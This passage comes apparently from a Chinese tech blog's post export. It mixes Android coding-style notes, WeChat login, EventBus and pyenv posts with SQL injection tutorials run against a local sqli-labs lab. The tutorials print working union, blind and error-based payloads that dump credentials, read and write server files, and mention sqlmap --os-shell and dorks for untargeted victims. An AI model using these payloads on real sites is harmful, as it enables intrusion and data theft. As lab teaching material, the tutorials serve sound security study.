has been checked in.\n\n和\n\n  // TODO: Change this to use a flag instead of a constant.\n\n如果您的TODO的形式是“在未来的日期做某事”，请确保您包括一个非常具体的日期（“修复在2005年11月”）或一个非常具体的事件（“删除此代码之后所有生产混音师理解协议V7 。“）。  \n\n16.日志节制  \n\n虽然记录是必要的，但它对性能具有显着的负面影响，并且如果不保持合理的简短，则快速失去其有用性。日志记录工具提供五个不同级别的日志记录：  \n\nERROR：当发生致命事件时使用，即某些会有用户可见的后果，并且如果没有显式删除某些数据，卸载应用程序，擦除数据分区或重新整理整个设备（或更糟），将无法恢复。此级别始终记录。在ERROR级别上证明某些日志记录的问题通常是被报告给统计信息收集服务器的好候选。  \n\nWARNING：在发生严重和意外事件时使用，即某些会有用户可见的后果，但可能通过执行一些明确的操作来恢复，而不会丢失数据，从等待或重新启动应用程序到重新下载新版本的应用程序或重新启动设备。此级别始终记录。在WARNING级别进行某些日志记录的问题也可能被考虑用于向统计信息收集服务器报告。  \n\nINFORMATIVE: 使用注意到，大多数人发生了有趣的事情，即当检测到可能具有广泛影响的情况时，虽然不一定是错误。这样的条件只能由合理地认为它是该域中最具权威性的模块记录（以避免非授权组件的重复日志记录）。此级别始终记录。  \n\nDEBUG：用于进一步注意设备上可能与调查和调试意外行为相关的内容。你应该只记录需要什么来收集有关你的组件发生什么的足够的信息。如果你的调试日志主导日志，那么你可能应该使用详细日志记录。  \n\n此级别将被记录，即使在发布版本上，并且需要被一个if (LOCAL_LOG)或if (LOCAL_LOGD) 块包围，其中LOCAL_LOG[D]在类或子组件中定义，因此可能存在禁用所有此类日志记录的可能性。因此，在if (LOCAL_LOG)块中必须没有活动逻辑。所有用于日志的字符串构建也需要放置在if (LOCAL_LOG)块内。如果它将导致字符串构建在if (LOCAL_LOG)块之外发生，则日志调用不应该重新映射到方法调用中。  \n还有一些代码仍然说if (localLOGV)。这也被认为是可接受的，虽然名称是非标准的。  \n\nVERBOSE：用于一切。此级别将仅在调试版本上记录，并且应由if (LOCAL_LOGV)块（或等效的）包围，因此可以默认编译出来。任何字符串构建将从发布版本中删除，并需要显示在if (LOCAL_LOGV)块内。  \n笔记：  \n\n在给定的模块中，除了VERBOSE级别之外，只有在可能的情况下才应报告错误。在模块内的单个函数调用链中，只有最内层函数应该返回错误，并且同一模块中的调用者应该只添加一些日志，如果这显着帮助隔离问题。  \n\n在一个模块链中，除了VERBOSE级别以外，当低级模块检测到来自高级模块的无效数据时，低级模块只应将此情况记录到DEBUG日志中，并且仅当日志记录提供对呼叫者不可用的信息。具体来说，不需要记录抛出异常的情况（异常应包含所有相关信息），或者记录的唯一信息包含在错误代码中。这在框架和应用程序之间的交互中尤其重要，由框架正确处理的第三方应用程序引起的条件不应该触发高于DEBUG级别的日志记录。  \n\n当通常证明某些日志记录可能发生多次的条件时，实施一些速率限制机制以防止用相同（或非常相似）信息的许多重复副本来溢出日志是一个好主意。  \n\n网络连接的损失被认为是常见的，完全预期的，不应该被无偿地记录。在应用程序中发生后果的网络连接丢失应在DEBUG或VERBOSE级别记录（取决于后果是否足够严重，并且意外足以登录到发布版本中）。\n在可由第三方应用程序访问或代表第三方应用程序访问的文件系统上具有完整的文件系统不应该记录在高于INFORMATIVE的级别。  \n\n来自任何不受信任的源（包括共享存储上的任何文件或来自任何网络连接的数据）的无效数据被认为是预期的，并且当检测到无效时，不应该在高于DEBUG的级别触发任何日志记录日志记录应尽可能有限）。  \n\n请记住，+在字符串上使用运算符时，隐式创建一个StringBuilder具有默认缓冲区大小（16个字符）和可能的其他临时String对象，即显式创建StringBuilders不比依赖于默认的'+'运算符更昂贵（事实上​​可以更高效）。请记住，调用的代码Log.v()在发布版本上编译和执行，包括构建字符串，即使日志没有被读取。  \n\n任何意图被其他人读取并在发布版本中可用的日志记录应该是简洁的，而不是含糊的，并且应该是可以理解的。这包括所有登录到DEBUG级别。  \n\n如果可能，记录应该保持在一行，如果有意义。线长度最多可达80或100个字符是完全可以接受的，如果可能，应避免长度大于约130或160个字符（包括标签的长度）。  \n\n不应使用高于VERBOSE的级别记录报告成功的日志。  \n\n用于诊断难以重现的问题的临时日志应该保存在DEBUG或VERBOSE级别，并且应该包含在允许在编译时完全禁用它的块。  \n小心日志中的安全漏洞。应避免私人信息。必须避免有关受保护内容的信息。这在编写框架代码时尤其重要，因为事先不容易知道什么将是和不会是私人信息或受保护的内容。  \n\nSystem.out.println()（或printf()本地代码）永远不要使用。System.out和System.err被重定向到/ dev / null，所以你的打印语句将没有可见的效果。然而，对于这些调用发生的所有字符串构建仍然被执行。  \n\n记录的黄金规则是，您的日志可能不会不必要地将其他日志推出缓冲区，就像其他人可能不会推出您的日志。  \n\n\n\n17.始终一致  \n\n我们分开的想法：一致。如果您正在编辑代码，请花几分钟时间查看周围的代码并确定其样式。如果该代码使用if子句周围的空格，你也应该。如果代码注释在他们周围有一些星星框，那么你的评论也有一些星星。  \n\n有风格指导的要点是有一个通用的编码词汇，所以人们可以专注于你在说什么，而不是你如何说。我们在这里提出全球风格规则，所以人们知道词汇，但本地风格也很重要。如果你添加到一个文件的代码看起来与现有的代码有很大的不同，当读者阅读它时，它会使读者脱离他们的节奏。尝试避免这一点。  \n\n\n18.Javatests样式规则  \n按照测试方法命名约定，使用下划线将要测试的内容与要测试的特定案例分开。这种风格使得更容易查看正在测试的案例。例如：  \n\ntestMethod_specificCase1 testMethod_specificCase2\n\nvoid testIsDistinguishable_protanopia() {\n    ColorMatcher colorMatcher = new ColorMatcher(PROTANOPIA)\n    assertFalse(colorMatcher.isDistinguishable(Color.RED, Color.BLACK))\n    assertTrue(colorMatcher.isDistinguishable(Color.X, Color.Y))\n}\n","tags":["android","code_standard"],"categories":["android"]},{"title":"android微信第三方登录1","url":"/post/2304481464.html","content":"\n[github测试地址](https://github.com/shaomiao/AndroidWechatTest)  \n[微信SDK下载地址](https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=11_1)  \n[微信开放平台](https://open.weixin.qq.com/)  \n[微信api](https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&t=resource/res_list&verify=1&id=1417751808&token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&lang=zh_CN)  \n\n## 开始接入微信登录\n\n1.申请你的AppID  \n注意：  \n\n##### 包名正确（重要）\n\n##### 签名正确（重要）\n\n微信提供的签名生成工具  \n把包名添加上去就可以获取签名  \n注意：把要获取签名的应用安装在手机上  \n[获取签名应用](https://res.wx.qq.com/open/zh_CN/htmledition/res/dev/download/sdk/Gen_Signature_Android2.apk)  \n\n2.下载开发工具包  \nhttps://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&t=resource/res_list&verify=1&id=open1419319167&lang=zh_CN  \n\n3.在项目中引入开发包  \n![在项目中引入开发工具包](http://upload-images.jianshu.io/upload_images/2590671-b6783667e961b04b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  \n\n4.使用开发工具包  \n下面代码都是在MainActivity中  \n[1]注册微信  \n\n<pre><code>\nprivate static final String APP_ID=\"你的appid\";\nprivate IWXAPI api;\nprivate void regToWx(){\n    api= WXAPIFactory.createWXAPI(this,APP_ID,true);\n    api.registerApp(APP_ID);\n}\n@Override\nprotected void onCreate(Bundle savedInstanceState) {\n      super.onCreate(savedInstanceState);\n      setContentView(R.layout.activity_main);\n      //注册微信\n      regToWx();\n}\n</code></pre>\n\t\n\t\n\t\n    \n[2]登录微信\n\n\t@Override\n\tprotected void onCreate(Bundle savedInstanceState) {\n\t\tsuper.onCreate(savedInstanceState);\n\t\tsetContentView(R.layout.activity_main);\n\t\t//注册微信\n\t\tregToWx();\n\t\tfindViewById(R.id.wechat_login).setOnClickListener(new View.OnClickListener() {\n\t\t\t@Override\n\t\t\tpublic void onClick(View v) {\n\t\t\t\t//登录微信\n\t\t\t\tfinal SendAuth.Req req = new SendAuth.Req();\n\t\t\t\treq.scope = \"snsapi_userinfo\";\n\t\t\t\treq.state = \"wechat_sdk_demo_test\";\n\t\t\t\tapi.sendReq(req);\n\t\t\t}\n\t\t});\n\t}\n5.下面是最重要的一步。。。。  \n[1]建包  \n注意：要在你的包名下新建 wxapi 包  \n你的包名.wxapi  \n\n![你的包名.wxapi](http://upload-images.jianshu.io/upload_images/2590671-972bd98cefcbe360.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n[2]建立与微信通讯的activity  \n在wxapi下新建activity  \nWXEntryActivity  \n[3]在AndroidManifest.xml中添加权限.   \n\n\t<uses-permission android:name=\"android.permission.INTERNET\"/> \n\t<uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/> \n\t<uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/> \n\t<uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/> \n\t<uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n[4]在AndroidManifest.xml中添加activity注册.   \n\n\t<activity android:name=\".wxapi.WXEntryActivity\"\n\t\tandroid:label=\"@string/app_name\"\n\t\tandroid:exported=\"true\"\n\t\tandroid:launchMode=\"singleTop\"\n\t\t>\n\t</activity>\n\n[5]在WXEntryActivity中继承Activity并实现IWXAPIEventHandler接口.   \n\n![实现IWXAPIEventHandler接口](http://upload-images.jianshu.io/upload_images/2590671-4a894506b8235e85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n重写onCreate方法  \n在onCreate中需要重新注册一下微信  \n要不微信不执行回掉  \n![重写onCreate方法](http://upload-images.jianshu.io/upload_images/2590671-bb5ff100cf328000.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n\n实现onReq和onResp方法  \n[使用okhttp获取微信的openid和用户信息](http://www.jianshu.com/p/c92e1134448d)\n\n在onResp中可以获取code  \n 通过code参数加上AppID和AppSecret等，通过API换取access_token；  \n 通过access_token进行接口调用，获取用户基本数据资源或帮助用户实现基本操作。  \n[详情请参照](https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&t=resource/res_list&verify=1&id=open1419317851&token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&lang=zh_CN)\n\n\n![onReq和onResp方法](http://upload-images.jianshu.io/upload_images/2590671-8052581cdb699373.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  \n","tags":["android","weixin"],"categories":["android"]},{"title":"1.3.1-SQL注入-SQL盲注-布尔盲注","url":"/post/2904355367.html","content":"## SQL盲注-布尔盲注\n\n### 01布尔盲注原理\n\t\n\t$id=$_GET['id'];\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1 \";\n\t$result=mysql_query($sql);\n\t$row=mysql_fetch_array($result);\n\tif($row)\n\t{\n\t\techo \"Right\";\n\t}\n\telse\n\t{\n\t\techo \"Wrong\";\n\t}\n\n\n代码存在SQL注入漏洞  \n然而页面即不会回显数据，也不会回显错误信息  \n\n只返回 “Right” 与 “Wrong”   \n\n这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的“真”和“假”来识别我们的判断是否正确，这既是布尔盲注！  \n\n\n正确请求，id=1 -> 返回 id=1的数据  \n\n错误请求，id=1' -> 返回 与正确页面不同的页面  \n1.如果页面返回“假”，说明系统执行的SQL语句为“假”如：id=1 and left((select version()),1)=5--+  \n2.想办法构造语句，判断数据库中内容的值  \n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/01.jpeg)\n\n### 02布尔盲注方法\n\n构造逻辑判断语句，判断信息的真假，取出所有的真值，实现SQL注入  \n\n\tleft() left(database(),1)>'s'\n\t\t\tdatabase()显示数据库名称，left(a,b)从左侧截取a的前b位\n\tregexp select user() regexp '^r'\n\t\t\t正则表达式的用法user()结果位root,regexp为匹配root的正则表达式\n\tlike\tselect user() like 'ro%'\n\t\t\t与regexp类似，使用like进行匹配\n\tsubstr()  ascii(substr((select database()),1,1))=98\n\tascii() substr(a,b,c)从b位置开始，截取字符串a到c长度，ascii()将某个字符转换为ascii值\n\tord()\tord(mid((select user()),1,1))=114\n\tmid()\tmid(a,b,c)从位置b开始，截取a字符串的c位ord()函数痛ascii(),将字符串转为ascii值\n\t\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/02.jpeg)\n\n\n[MySql正则表达式](http://www.runoob.com/mysql/mysql-regexp.html)\n\n注入点： \n\n\thttp://localhost:90/Less-8/?id=1'\n\thttp://localhost:90/Less-8/?id=1' and left((select database()),1)='a'--+\n\thttp://localhost:90/Less-8/?id=1' and left((select database()),1)='s'--+ 显示正确第一位为s\n\n\thttp://localhost:90/Less-8/?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e'--+ 第一个表名称字符\n\n\thttp://localhost:90/Less-8/?id=1' and (select database() regexp '^s')--+\n\n\thttp://localhost:90/Less-8/?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp '^s')--+\n\n\thttp://localhost:90/Less-8/?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like 'e%')--+\n\n\thttp://localhost:90/Less-8/?id=1 and ascii((substr((select database()),1,1))=115--+\n\n\thttp://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from information_schema.tables where table_schema=database()),1,1))=115--+\n\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/ascii.jpg)\n\n\n## burp操作步骤\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/03.png)\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/04.jpg)\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/05.png)\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/06.png)\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/07.jpg)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["sql注入","sql盲注"],"categories":["web安全"]},{"title":"android EventBus 使用","url":"/post/3369655730.html","content":"\n\n2017 10 27  \nEventBus是什么？  \n首先有两个概念发布者/订阅者  \n\n发布者就是 发送事件  \n订阅者 就是接收事件  \n\n\tgradle\n\t\n\tcompile 'org.greenrobot:eventbus:3.0.0'\n\n\n1.定义事件\n\n<pre><code>\n// 定义事件 这个就是你要传送的数据实体类\npublic static class MessageEvent { /* Additional fields if needed */ }\n</code></pre>\n\t\n\n2.准备订阅者\n\n<pre><code>\n@Subscribe(threadMode = ThreadMode.MAIN)  \npublic void onMessageEvent(MessageEvent event) {/* Do something */};\n\t\n// 订阅者 接受数据的方法 threadMode  是运行在什么线程模式\nhttp://greenrobot.org/eventbus/documentation/delivery-threads-threadmode/\n</code></pre>\n\n注册和取消注册订阅者\n\n\t @Override\n\t public void onStart() {\n\t\t super.onStart();\n\t\t EventBus.getDefault().register(this);\n\t }\n\n\t @Override\n\t public void onStop() {\n\t\t super.onStop();\n\t\t EventBus.getDefault().unregister(this);\n\t }\n\n3.发送事件\n\n\t`EventBus.getDefault().post(new MessageEvent());`","tags":["android","eventbus"],"categories":["android"]},{"title":"1.2.1-SQL注入-SQL注入语法类型-union联合查询注入","url":"/post/2839042794.html","content":"\n## union查询注入\n\n### union介绍\n\nSQL UNION 操作符  \n用于合并两个或多个SELECT语句的结果集。  \n注意：  \nSELECT语句必须拥有**相同数量**的列。  \n列也必须拥有**相似的数据类型**。  \n每条SELECT语句中列的**顺序必须相同**。  \n\n默认情况，UNION操作符选取不同的值，允许重复的值，使用UNION ALL。  \n\n\tSELECT column_name(s) FROM table_name1\n\tUNION\n\tSELECT column_name(s) FROM table_name2\n\n\tSELECT column_name(s) FROM table_name1\n\tUNION ALL\n\tSELECT column_name(s) FROM table_name2\n\n### union查询注入方法\n\n#### UNION 注入应用场景  \n\n前提：  \n1.只要UNION连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果；\n2.注入点页面有回显；\n\n注意点：  \n1.只有最后一个SELECT子句允许有ORDER BY；\n2.只有最后一个SELECT子句允许有LIMIT；\n\n\tmysql> select * from users order by id union select 1,2,3;\n\t错误 orderby 要在最后一个子句后面\n\n\tmysql> select * from users limit 0,1 union select;\n\t错误 limit 要在最后一个子句后面\n\n#### UNION注入过程-根据Sqli-labs Less1-4学习\n\ntips：order by 猜出来的列数超过数据库表中的列数，报错并不能返回数据  \n\n1. order by 确定列数\n2. 观察页面返回，选取可以显示数据的位置，进行下一步的注入\n3. 读库信息\n4. 读表信息 \n5. 读字段\n6. 读数据\n\n\n---\n\n\n\n\tdocker run -dt --name sqli -p 90:80 --rm acgpiano/sqli-labs \n\tdocker ps -a\n\tdocker exec -it <id> /bin/bash\n\tmysql -uroot -p\n\tshow databases;\n\tuse security;\n\n\t1. select * from users order by 4; // order by 判断多少列 从1～3 报错了确定有4列\n\n\t2. select * from users where id=1 union select 1,2,3;\n\tselect * from users where id=-1 union select 1,(select version()),3;\n\n\t3. select * from users where id=-1 union select 1,2,(select group_concat(schema_name) from information_schema.schemata);\n\n\t4. select * from users where id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security'); // 当前库可以换成database() ''不识别可以换成十六进制0x\n\n\t5. select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users');\n\n\t6. select * from users where id=-1 union select 1,2,(select group_concat(username,0x7e,password) from users);\n\n\n浏览器访问：  \nhttp://127.0.0.1:90/Less-1/  \n\n\thttp://127.0.0.1:90/Less-1/?id=1'\n\thttp://127.0.0.1:90/Less-1/?id=1' order by 1 --+ // 二分法试\n\thttp://127.0.0.1:90/Less-1/?id=-1' union select 1,2,3 --+\n\thttp://127.0.0.1:90/Less-1/?id=-1' union select 1,2,(version())--+ // user() database()\n\n\thttp://127.0.0.1:90/Less-1/?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+\n\n\thttp://127.0.0.1:90/Less-1/?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')--+\n\n\thttp://127.0.0.1:90/Less-1/?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users')--+\n\n\thttp://127.0.0.1:90/Less-1/?id=-1' union select 1,2,(select group_concat(username,0x7e,password) from users)--+\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["sql注入"],"categories":["web安全"]},{"title":"1.2.2-SQL注入-SQL注入语法类型-报错注入","url":"/post/4239639054.html","content":"\n## 报错注入\n\n### 01 报错注入原理\n\n构造payload让信息通过错误提示回显出来  \n应用场景：  \n查询不回显内容，会打印错误信息  \nUpdate、insert等语句，会打印错误信息  \n\n\tif($row)\n\t{\n\t\techo 'Your Login name:'.$row['username'];\n\t}\n\telse\n\t{\n\t\tprint_r(mysql_error());\n\t}\n\n### 02 报错注入方法\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/01.png)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/02.png)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/03.png)\n\n\tselect count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));\n\n\thttp://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))--+\n\n\thttp://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)))--+\n\n\thttp://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat((select database() limit 0,1),0x7e,floor(rand(0)*2)))--+ // 表名\n\n\thttp://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名\n\n\thttp://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名\n\n\thttp://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e,floor(rand(0)*2)))--+ // 数据\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/04.png)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/05.png)\n\n\t// 特殊符号导致方法报错，报错可以输出错误信息\n\tselect ectractvalue(1,concat(0x7e,(select user()),0x7e));\n\tselect updatexml(1,concat(0x7e,(select user()),0x7e),1);  \n\n\t报错注入只有32位长 用 substr截取字符串substr('ab',1,2) // 从第一位截取两个\n\thttp://127.0.0.1:90/Less-1/?id=1' and updatexml(1,concat(0x7e,(select substr(concat(password),1,2) from users limit 0,1),0x7e),1) --+\n\n\n\n\n\n\n\n\n","tags":["sql注入"],"categories":["web安全"]},{"title":"启动docker_sqli-labs_命令","url":"/post/2422499851.html","content":"\t\n\tdocker images\n\n\tdocker run -dt --name sqli -p 90:80 --rm acgpiano/sqli-labs\n\n\tdocker ps -a\n\n\tdocker exec -it <id> /bin/bash\n\n\tmysql -uroot // 进入 mysql\n\n\n\tdocker ps -a \n\tdocker stop <id> // 停止容器\n\tdocker rm </sqli> // 删除容器\t\n\tdocker rmi <image id> 删除镜像\n\n\tcd /var/www/html\n\n## LINKS\n\n[Docker删除容器与镜像](https://blog.csdn.net/qq_32447301/article/details/79387649)  ","tags":["web安全","docker","sqli-labs"],"categories":["web安全"]},{"title":"使用pyenv切换python版本","url":"/post/849770471.html","content":"\n## 关键代码\n\n\twhich python3.6\n\n\tbrew install pyenv\n\n\tpyenv install --list // 可安装的python版本\n\tpyenv install -v 2.7.10 // 安装python\n\tpyenv rehash // 更新\n\tpyenv versions // 查看已经安装的python版本\n\tpyenv global 2.7.10 // 切换python版本\n\tpyenv global system // 切换原来版本\n\n\tpython --version\n\n## LINKS\n\n[在macOS上通过pyenv安装和切换多版本Python](https://www.cnblogs.com/blackmatrix/p/5591341.html)   \n\n[python安装目录](https://blog.csdn.net/shelldawn/article/details/77912902)  \n\n[使用pyenv管理不同的python版本](https://www.cnblogs.com/zydev/p/7802079.html)  \n\n[Mac Python路径总结](https://blog.csdn.net/transformer_wsz/article/details/72848547)  ","tags":["python","pyenv"],"categories":["python"]},{"title":"1.1.1-SQL注入-SQL注入基础-Web应用框架分析","url":"/post/2839062402.html","content":"\n# SQL注入漏洞原理与利用\n\n## Web应用框架分析\n### 01 WEB框架\nwebapp->  \n\tweb前端  \n\tweb应用CMS／OA／Blog  \n\tWeb开发框架：Django／Struts2/ThinkPHP  \n\tWeb语言：PHP/JSP/.Net  \n\n---\n\n容器->  \n\tIIS、Apach、TomCat、Nginx\n\n\n### 02 理解SQL注入\n所有SQL语句 都有可能SQL注入  \n","tags":["sql注入","web安全"],"categories":["web安全"]},{"title":"1.1.1-SQL注入-SQL注入基础-SQL手工注入方法","url":"/post/1129050045.html","content":"## MySQL手工注入\n### 01 MySQL数据库结构\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/01.png)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/02.png)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/03.jpg)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/04.png)\n\n核心原理：  \nMySql内置的infromation_schema库，它功能强大，是我们进行MySql注入的基石！  \n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/05.png)\n\n\tselect schema_name from information_schema.schemata // 查库\n\tselect table_name from information_schema.tables where table_schema=库名 // 查表\n\tselect column_name from information_schema.columns where table_name=表名 // 查列\n\tselect 列名 from 库名.表名 // 查数据\n\t\n\t\n\tselect column_name from information_schema.columns where table_name=0x7573657273;\n\t\n\t\n\t![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/06.png)\n\t\n\tselect group_concat(schema_name) from information_schema.schemata;\n\tselect username,password from security.users limit 0,1;\n\t\n---\n\n### 02 MySQL手工注入方法\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/07.jpg)\n\n\thttp://127.0.0.1/Less-1/?id=2\n\thttp://127.0.0.1/Less-1/?id=2' 注入点\n\thttp://127.0.0.1/Less-1/?id=2' and '1'='1 正常\n\thttp://127.0.0.1/Less-1/?id=2' and '1'='2 报错\n\t\n\thttp://127.0.0.1/Less-1/?id=2' order by 3--+ 判断字段长度\n\thttp://127.0.0.1/Less-1/?id=2' order by 4--+ 返回错误\n\t\n\thttp://127.0.0.1/Less-1/?id=2' union select 1,2,3--+\n\thttp://127.0.0.1/Less-1/?id=-1' union select 1,2,3--+ 判断数据显示位置\n\t\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+ 提示more than 1 row 查询库名\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+ 当前库\n\t\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,(select concat_ws('~',username,password) from security.users limit 0,1)--+\n\t\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)--+\n\t\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+\n\t\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,(select database())--+\n\t\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,(select load_file('/var/www/html/sql-connections/db-creds.inc'))--+ 读文件\n\t\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,(select 'test' into outfile '/var/www/html/sql-connections/t.txt')--+ 写文件\n\t\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,(select 'test' into outfile '/tmp/t.txt')--+ 写文件\n\t\n\t\n\t\nhttp://127.0.0.1:90/Less-1/\n\n\t\n\n\n","tags":["sql注入","web安全"],"categories":["web安全"]},{"title":"1.1.1-SQL注入-SQL注入基础-SQL注入流程","url":"/post/820776471.html","content":"\n### SQL注入流程\n#### 01 寻找SQL注入点\n##### 寻找SQL注入点\n\n无特定目标：  \ninurl:.php?id=  \n\n有特定目标：  \ninurl:.php?id=site:target.com \n// jsp sid   \n\n工具爬取：  \nspider,对搜索引擎和目标网站的链接进行爬取  \n\n**注入识别**  \n手工简单识别：  \n\t\n\t'\n\tand 1=1 / and 1=2\n\tand '1'='1 / and '1'='2 \n\tand 1 like 1 / and 1 like 2\n\n工具识别：  \n\t\n\tsqlmap -m filename (filename中保存检测目标)\n\tsqlmap --crawl(sqlmap对目标网站进行爬取，然后依次进行测试)\n \n**高级识别：**  \n扩展识别广度和深度：  \n\t\n\tSqlMap --level 增加测试级别，对header中相关参数也进行测试\n\tsqlmap -r filename (filename中为网站请求数据)\n\n利用工具提高识别效率：\n\t\n\tBurpSuite + SqlMap\n\tBurpSuite拦截所有浏览器访问提交的数据\n\tBurpSuite扩展插件，直接调用SqlMap进行测试\n\n一些Tips：  \n\n可以在参数后键入“*” 来确定想要测试的参数  \n可能出现注入的点：新闻、登录、搜索、留言... ...  \n站在开发的角度去寻找  \n\n\n---\n\t\n\tpython sqlmap.py -r 1.txt\n\nburp sqlmap 扩展  \nBurp-> Extender->BApp Store -> SQLiPy Sqlmap  \n\n**代码审计：**\n\n搜索关键代码和函数  \n梳理业务流程  \n\n强网杯WEB “python is the best language”  \n\n\thttp://test.com/register  \n\tPOST:  \n\n\tusername=test&email=t@t.com&password=123&password2=123&submit=Register  \n\tusername=test&email=t@t.com' and '1' = '1&password=123&password2=123&submit=Register  \n\n\n\n#### 02 SQL注入流程\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/01.png)\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/02.png)\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/03.png)\n\n数据获取\n\t\n\tweb.mdb\n\t\n\tselect [*] from admin\n\tselect [*] from system\n\t\n\tselect [username] from system\n\tselect [name] from system\n\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/04.png)\n\n提权\n\t\n\txp.cmdshell\n\t\n\t--os-shell // 执行系统命令 写webshell到网站目录\n\t\n\t\n\n\n","tags":["sql注入","web安全"],"categories":["web安全"]},{"title":"1.1.1-SQL注入-SQL注入基础-Web应用框架分析-MySql注入方法逻辑运算及常用函数","url":"/post/1786754042.html","content":"## MySql常用函数及逻辑运算\n### 01 常用的函数\nMySql内置函数：  \nhttps://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html  \n\nMySql注入常用函数\n\n\t函数名称 函数功能\n\tsystem_user() 系统用户名\n\tuser() 用户名\n\tcurrent_user() 当前用户名\n\tsession_user() 连接数据库的用户名\n\tdatabase() 数据库名\n\tversion() @@version 数据库版本\n\t@@datadir 数据库路径\n\t@@basedir 数据库安装路径\n\t@@version_compile_os 操作系统\n\tcount() 返回执行结果数量\n\tconcat() 没有分隔符地连接字符串\n\tconcat_ws() 含有分隔符地连接字符串\n\tgroup_concat() 连接一个组的所有字符串，并以逗号分隔每一条数据\n\tload_file() 读取本地文件\n\tinto outfile 写文件\n\tascii() 字符串的ASCII代码值\n\tord() 返回字符串第一个字符的ASCII值\n\tmid() 返回一个字符串的一部分\n\tsubstr() 返回一个字符串的一部分\n\tlength() 返回字符串的长度\n\n\tleft() 返回字符串的最左面几个字符\n\tfloor() 返回小于或等于x的最大整数\n\trand() 返回0和1之间的一个随机数\n\textractvalue() 